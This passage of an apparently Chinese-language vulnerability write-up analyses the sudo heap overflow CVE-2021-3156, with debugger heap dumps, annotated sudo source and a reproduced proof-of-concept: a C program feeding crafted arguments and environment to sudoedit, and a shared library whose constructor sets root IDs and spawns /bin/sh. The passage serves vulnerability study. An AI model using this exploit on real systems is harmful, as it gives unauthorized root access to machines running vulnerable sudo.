class=\"number\">0x74736e6920676e69</span>\t<span class=\"number\">0x6e6f6974616c6c61</span></span><br><span class=\"line\"><span class=\"number\">0x5555557866e0</span>:\t<span class=\"number\">0x756f792066692073</span>\t<span class=\"number\">0x230a216873697720</span></span><br><span class=\"line\"><span class=\"number\">0x5555557866f0</span>:\t<span class=\"number\">0x6c616e694620230a</span>\t<span class=\"number\">0x61656c70202c796c</span></span><br><span class=\"line\"><span class=\"number\">0x555555786700</span>:\t<span class=\"number\">0x2065746f6e206573</span>\t<span class=\"number\">0x6973752074616874</span></span><br><span class=\"line\"><span class=\"number\">0x555555786710</span>:\t<span class=\"number\">0x762065687420676e</span>\t<span class=\"number\">0x6f63206f64757369</span></span><br><span class=\"line\"><span class=\"number\">0x555555786720</span>:\t<span class=\"number\">0x736920646e616d6d</span>\t<span class=\"number\">0x6365722065687420</span></span><br><span class=\"line\"><span class=\"number\">0x555555786730</span>:\t<span class=\"number\">0x6465646e656d6d6f</span>\t<span class=\"number\">0x7420230a79617720</span></span><br><span class=\"line\"><span class=\"comment\">//观察堆布局</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: <span class=\"number\">0x555555786640</span></span><br><span class=\"line\">Size: <span class=\"number\">0x31</span></span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (unsortedbin) | IS_MMAPED | NON_MAIN_ARENA</span><br><span class=\"line\">Addr: <span class=\"number\">0x555555786670</span></span><br><span class=\"line\">Size: <span class=\"number\">0x6969686867676666</span></span><br><span class=\"line\">fd: <span class=\"number\">0x6d6d6c6c6b6b6767</span></span><br><span class=\"line\">bk: <span class=\"number\">0x7ffff7206e6e</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>那么为什么会出现这样的情况?</p>\n<p>本意:aabbccddeeffgghhiiggkkllmmnn</p>\n<p>实际:aabbccddeeffgghhiiggkkllmmnn()aabbccddeeffggiiggkkllmmnn()</p>\n</blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t\t<span class=\"keyword\">for</span> (to = user_args, av = NewArgv + <span class=\"number\">1</span>; (from = *av); av++) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//to是刚分配的地方 NewArgv[0]=sudoedit *av=\\\\x00 NewArgv[2]=\"aabbccddeeffgghhiiggkkllmmnn\"</span></span><br><span class=\"line\">\t\t    <span class=\"keyword\">while</span> (*from) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (from[<span class=\"number\">0</span>] == <span class=\"string\">'\\\\'</span> &amp;&amp; !<span class=\"built_in\">isspace</span>((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span>)from[<span class=\"number\">1</span>]))</span><br><span class=\"line\">                <span class=\"comment\">//若from[0]为\\并且from[1]不是空白，则from++</span></span><br><span class=\"line\">\t\t\t    from++;<span class=\"comment\">//from++指向了\\x00</span></span><br><span class=\"line\">\t\t\t*to++ = *from++;<span class=\"comment\">//from++指向了下一个字符串，之后不会进入if语句</span></span><br><span class=\"line\">\t\t    &#125;</span><br><span class=\"line\">\t\t    *to++ = <span class=\"string\">' '</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t*--to = <span class=\"string\">'\\0'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//标准的空白字符包括：</span></span><br><span class=\"line\"><span class=\"string\">' '</span>     (<span class=\"number\">0x20</span>)    space (SPC) 空格符</span><br><span class=\"line\">'\\t'    (0x09)    horizontal tab (TAB) 水平制表符    </span><br><span class=\"line\"><span class=\"string\">'\\n'</span>    (<span class=\"number\">0x0a</span>)    newline (LF) 换行符</span><br><span class=\"line\">'\\v'    (0x0b)    vertical tab (VT) 垂直制表符</span><br><span class=\"line\"><span class=\"string\">'\\f'</span>    (<span class=\"number\">0x0c</span>)    feed (FF) 换页符</span><br><span class=\"line\">'\\r'    (0x0d)    carriage return (CR) 回车符</span><br><span class=\"line\">函数原型：<span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isspace</span><span class=\"params\">(<span class=\"keyword\">int</span> c)</span></span>;</span><br><span class=\"line\">返回值：如果 c 是一个空白字符，则该函数返回非零值（<span class=\"literal\">true</span>），否则返回 <span class=\"number\">0</span>（<span class=\"literal\">false</span>）。</span><br></pre></td></tr></table></figure>\n<p>循环之前</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">16</span>g to<span class=\"number\">-0x10</span></span><br><span class=\"line\"><span class=\"number\">0x5555557865f0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000031</span></span><br><span class=\"line\"><span class=\"number\">0x555555786600</span>:\t<span class=\"number\">0x00007ffff79b5ca0</span>\t<span class=\"number\">0x00007ffff79b5ca0</span></span><br><span class=\"line\"><span class=\"number\">0x555555786610</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x555555786620</span>:\t<span class=\"number\">0x2065766f62612065</span>\t<span class=\"number\">0x0000000000000d91</span></span><br><span class=\"line\"><span class=\"number\">0x555555786630</span>:\t<span class=\"number\">0x00007ffff79b5ca0</span>\t<span class=\"number\">0x00007ffff79b5ca0</span></span><br><span class=\"line\"><span class=\"number\">0x555555786640</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x555555786650</span>:\t<span class=\"number\">0x7420656c69662073</span>\t<span class=\"number\">0x656c62616e65206f</span></span><br><span class=\"line\"><span class=\"number\">0x555555786660</span>:\t<span class=\"number\">0x7369687420230a20</span>\t<span class=\"number\">0x6f6974636e756620</span></span><br></pre></td></tr></table></figure>\n<p>for外层循环一次，其实已经复制完成了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">32</span>gx to<span class=\"number\">-0x2d</span></span><br><span class=\"line\"><span class=\"number\">0x5555557865f0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000031</span></span><br><span class=\"line\"><span class=\"number\">0x555555786600</span>:\t<span class=\"number\">0x6463636262616100</span>\t<span class=\"number\">0x6867676666656564</span></span><br><span class=\"line\"><span class=\"number\">0x555555786610</span>:\t<span class=\"number\">0x6c6b6b6767696968</span>\t<span class=\"number\">0x0000006e6e6d6d6c</span></span><br><span class=\"line\"><span class=\"number\">0x555555786620</span>:\t<span class=\"number\">0x2065766f62612065</span>\t<span class=\"number\">0x0000000000000d91</span></span><br><span class=\"line\"><span class=\"number\">0x555555786630</span>:\t<span class=\"number\">0x00007ffff79b5ca0</span>\t<span class=\"number\">0x00007ffff79b5ca0</span></span><br><span class=\"line\"><span class=\"number\">0x555555786640</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x555555786650</span>:\t<span class=\"number\">0x7420656c69662073</span>\t<span class=\"number\">0x656c62616e65206f</span></span><br><span class=\"line\"><span class=\"number\">0x555555786660</span>:\t<span class=\"number\">0x7369687420230a20</span>\t<span class=\"number\">0x6f6974636e756620</span></span><br></pre></td></tr></table></figure>\n<p>由于*av!=NULL，所以循环两次</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">32</span>gx to<span class=\"number\">-0x4a</span></span><br><span class=\"line\"><span class=\"number\">0x5555557865f0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000031</span></span><br><span class=\"line\"><span class=\"number\">0x555555786600</span>:\t<span class=\"number\">0x6463636262616100</span>\t<span class=\"number\">0x6867676666656564</span></span><br><span class=\"line\"><span class=\"number\">0x555555786610</span>:\t<span class=\"number\">0x6c6b6b6767696968</span>\t<span class=\"number\">0x6161206e6e6d6d6c</span></span><br><span class=\"line\"><span class=\"number\">0x555555786620</span>:\t<span class=\"number\">0x6565646463636262</span>\t<span class=\"number\">0x6969686867676666</span></span><br><span class=\"line\"><span class=\"number\">0x555555786630</span>:\t<span class=\"number\">0x6d6d6c6c6b6b6767</span>\t<span class=\"number\">0x00007ffff79b6e6e</span></span><br><span class=\"line\"><span class=\"number\">0x555555786640</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x555555786650</span>:\t<span class=\"number\">0x7420656c69662073</span>\t<span class=\"number\">0x656c62616e65206f</span></span><br><span class=\"line\"><span class=\"number\">0x555555786660</span>:\t<span class=\"number\">0x7369687420230a20</span>\t<span class=\"number\">0x6f6974636e756620</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>多次调试，偏移可能不太对</p>\n</blockquote>\n<p>ok,堆溢出分析完成。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">32</span>gx <span class=\"number\">0x555555786650</span><span class=\"number\">-0x10</span></span><br><span class=\"line\"><span class=\"number\">0x555555786640</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000031</span>\t==&gt;chunk <span class=\"built_in\">size</span></span><br><span class=\"line\"><span class=\"number\">0x555555786650</span>:\t<span class=\"number\">0x6463636262616100</span>\t<span class=\"number\">0x6867676666656564</span></span><br><span class=\"line\"><span class=\"number\">0x555555786660</span>:\t<span class=\"number\">0x6c6b6b6767696968</span>\t<span class=\"number\">0x6161206e6e6d6d6c</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0x555555786670</span>:\t<span class=\"number\">0x6565646463636262</span>\t<span class=\"number\">0x6969686867676666</span>  ==&gt;chunk <span class=\"built_in\">size</span>  </span><br><span class=\"line\"><span class=\"number\">0x555555786680</span>:\t<span class=\"number\">0x6d6d6c6c6b6b6767</span>\t<span class=\"number\">0x00007ffff7206e6e</span></span><br><span class=\"line\"><span class=\"number\">0x555555786690</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x5555557866a0</span>:\t<span class=\"number\">0x7420656c69662073</span>\t<span class=\"number\">0x656c62616e65206f</span></span><br><span class=\"line\"><span class=\"number\">0x5555557866b0</span>:\t<span class=\"number\">0x7369687420230a20</span>\t<span class=\"number\">0x6f6974636e756620</span></span><br><span class=\"line\"><span class=\"number\">0x5555557866c0</span>:\t<span class=\"number\">0x66207974696c616e</span>\t<span class=\"number\">0x747369786520726f</span></span><br><span class=\"line\"><span class=\"number\">0x5555557866d0</span>:\t<span class=\"number\">0x74736e6920676e69</span>\t<span class=\"number\">0x6e6f6974616c6c61</span></span><br><span class=\"line\"><span class=\"number\">0x5555557866e0</span>:\t<span class=\"number\">0x756f792066692073</span>\t<span class=\"number\">0x230a216873697720</span></span><br><span class=\"line\"><span class=\"number\">0x5555557866f0</span>:\t<span class=\"number\">0x6c616e694620230a</span>\t<span class=\"number\">0x61656c70202c796c</span></span><br><span class=\"line\"><span class=\"number\">0x555555786700</span>:\t<span class=\"number\">0x2065746f6e206573</span>\t<span class=\"number\">0x6973752074616874</span></span><br><span class=\"line\"><span class=\"number\">0x555555786710</span>:\t<span class=\"number\">0x762065687420676e</span>\t<span class=\"number\">0x6f63206f64757369</span></span><br><span class=\"line\"><span class=\"number\">0x555555786720</span>:\t<span class=\"number\">0x736920646e616d6d</span>\t<span class=\"number\">0x6365722065687420</span></span><br><span class=\"line\"><span class=\"number\">0x555555786730</span>:\t<span class=\"number\">0x6465646e656d6d6f</span>\t<span class=\"number\">0x7420230a79617720</span></span><br><span class=\"line\"><span class=\"comment\">//观察堆布局</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: <span class=\"number\">0x555555786640</span></span><br><span class=\"line\">Size: <span class=\"number\">0x31</span></span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (unsortedbin) | IS_MMAPED | NON_MAIN_ARENA</span><br><span class=\"line\">Addr: <span class=\"number\">0x555555786670</span></span><br><span class=\"line\">Size: <span class=\"number\">0x6969686867676666</span></span><br><span class=\"line\">fd: <span class=\"number\">0x6d6d6c6c6b6b6767</span></span><br><span class=\"line\">bk: <span class=\"number\">0x7ffff7206e6e</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"0x07-POC分析\"><a href=\"#0x07-POC分析\" class=\"headerlink\" title=\"0x07 POC分析\"></a>0x07 POC分析</h1><p><a href=\"https://github.com/blasty/CVE-2021-3156\" target=\"_blank\" rel=\"noopener\">https://github.com/blasty/CVE-2021-3156</a></p>\n<h2 id=\"1-分析poc\"><a href=\"#1-分析poc\" class=\"headerlink\" title=\"1. 分析poc\"></a>1. 分析poc</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *sh=<span class=\"string\">\"/usr/bin/sudoedit\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">char</span>* argv[]=&#123;<span class=\"string\">\"sudoedit\"</span>,<span class=\"string\">\"-s\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\\\\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\\\\\"</span>,<span class=\"literal\">NULL</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">char</span>* envp[]=&#123;<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"\\\\\"</span>,<span class=\"string\">\"X/P0P_SH3LLZ_\"</span>, <span class=\"string\">\"LC_ALL=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"</span>,<span class=\"literal\">NULL</span></span><br><span class=\"line\">                &#125;;</span><br><span class=\"line\">    execve(sh,argv,envp);</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    printf(\"[+] bl1ng bl1ng! We got it!\\n\");</span></span><br><span class=\"line\"><span class=\"comment\">    setuid(0); seteuid(0); setgid(0); setegid(0);</span></span><br><span class=\"line\"><span class=\"comment\">    static char *a_argv[] = &#123; \"sh\", NULL &#125;;</span></span><br><span class=\"line\"><span class=\"comment\">    static char *a_envp[] = &#123; \"PATH=/bin:/usr/bin:/sbin\", NULL &#125;;</span></span><br><span class=\"line\"><span class=\"comment\">    execv(\"/bin/sh\", a_argv);</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>直接替换<code>hax.c</code>然后gcc即可提权</p>\n<p>分析一下</p>\n<blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;<span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\">&gt;<span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">execve</span> <span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *filename, <span class=\"keyword\">char</span> *<span class=\"keyword\">const</span> argv [], <span class=\"keyword\">char</span> *<span class=\"keyword\">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure>\n<p>简单说一下，在代码中首先定义了：char <em>sh、char</em> argv[]、char* envp[]：</p>\n<ul>\n<li>char *sh：代表着要运行的程序，这里就是/usr/bin/目录下的sudoedit。</li>\n<li>char* argv[]：sudoedit运行前向其传入的命令及参数：sudo -s …….</li>\n<li>char* envp[]：代表着传入的环境变量</li>\n</ul>\n</blockquote>\n<h2 id=\"2-分析-so\"><a href=\"#2-分析-so\" class=\"headerlink\" title=\"2. 分析.so\"></a>2. 分析.so</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> __attribute__ ((constructor)) _init(<span class=\"keyword\">void</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> _init(<span class=\"keyword\">void</span>) &#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"[+] bl1ng bl1ng! We got it!\\n\"</span>);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifndef</span> BRUTE</span></span><br><span class=\"line\">\tsetuid(<span class=\"number\">0</span>); seteuid(<span class=\"number\">0</span>); setgid(<span class=\"number\">0</span>); setegid(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">static</span> <span class=\"keyword\">char</span> *a_argv[] = &#123; <span class=\"string\">\"sh\"</span>, <span class=\"literal\">NULL</span> &#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">static</span> <span class=\"keyword\">char</span> *a_envp[] = &#123; <span class=\"string\">\"PATH=/bin:/usr/bin:/sbin\"</span>, <span class=\"literal\">NULL</span> &#125;;</span><br><span class=\"line\">\texecv(<span class=\"string\">\"/bin/sh\"</span>, a_argv);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>1.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;<span class=\"keyword\">static</span> <span class=\"keyword\">void</span> __attribute__ ((constructor)) _init(<span class=\"keyword\">void</span>);</span><br></pre></td></tr></table></figure>\n<p>看不懂什么东西?</p>\n<p>GNU C 的一大特色就是<code>__attribute__</code> 机制。<code>__attribute__</code> 可以设置函数属性（Function Attribute ）、变量属性（Variable Attribute ）和类型属性（Type Attribute ）。</p>\n<p><code>__attribute__</code> 书写特征是：<code>__attribute__</code> 前后都有两个下划线，并切后面会紧跟一对原括弧，括弧里面是相应的<code>__attribute__</code> 参数。</p>\n<p><code>constructor</code>参数让系统执行<code>main()</code>函数之前调用函数(被<code>__attribute__((constructor))</code>修饰的函数).同理, <code>destructor</code>让系统在<code>main()</code>函数退出或者调用了<code>exit()</code>之后,调用我们的函数.带有这些修饰属性的函数,对于我们初始化一些在程序中使用的数据非常有用.</p>\n<p>也就是说在执行main函数之前先执行__init函数</p>\n<p>2.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;<span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\">&gt;<span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">seteuid</span><span class=\"params\">(<span class=\"keyword\">uid_t</span> uid)</span></span>;</span><br><span class=\"line\">&gt;<span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">setegid</span><span class=\"params\">(gid_ gid)</span></span>;</span><br></pre></td></tr></table></figure>\n<p>只设置euid</p>\n</blockquote>\n<h2 id=\"3-如何加载so\"><a href=\"#3-如何加载so\" class=\"headerlink\" title=\"3. 如何加载so\"></a>3. 如何加载so</h2><h3 id=\"nss\"><a href=\"#nss\" class=\"headerlink\" title=\"nss\"></a>nss</h3><p>nss_load_library是glibc中nss的一个函数，而NSS（Name Service Switch）相关配置文件存储在/etc/nsswitch.conf，这个文件是用来解析用户ID登录名称、IP地址转换为主机名等</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># /etc/nsswitch.conf</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Example configuration of GNU Name Service Switch functionality.</span></span><br><span class=\"line\"><span class=\"comment\"># If you have the `glibc-doc-reference' and `info' packages installed, try:</span></span><br><span class=\"line\"><span class=\"comment\"># `info libc \"Name Service Switch\"' for information about this file.</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#搜索项          #搜索方式           路径名             搜索项存放的内容</span></span><br><span class=\"line\">passwd:         compat systemd <span class=\"comment\">#在/etc/passwd中搜索     用户口令</span></span><br><span class=\"line\">group:          compat systemd <span class=\"comment\">#在/etc/group中搜索      用户所在组</span></span><br><span class=\"line\">shadow:         compat         <span class=\"comment\">#在/etc/shadow中搜索     映射口令信息</span></span><br><span class=\"line\">gshadow:        files          <span class=\"comment\">#在/etc/gshadow中搜索    组用户的密码信息</span></span><br><span class=\"line\"><span class=\"comment\">##（systemd：自启动服务）</span></span><br><span class=\"line\">hosts:          files mdns4_minimal [NOTFOUND=<span class=\"built_in\">return</span>] dns myhostname</span><br><span class=\"line\">                               <span class=\"comment\">#在/etc/hosts中搜索      主机名和主机号</span></span><br><span class=\"line\">networks:       files          <span class=\"comment\">#在/etc/networks中搜索   网络名及网络号</span></span><br><span class=\"line\"></span><br><span class=\"line\">protocols:      db files       <span 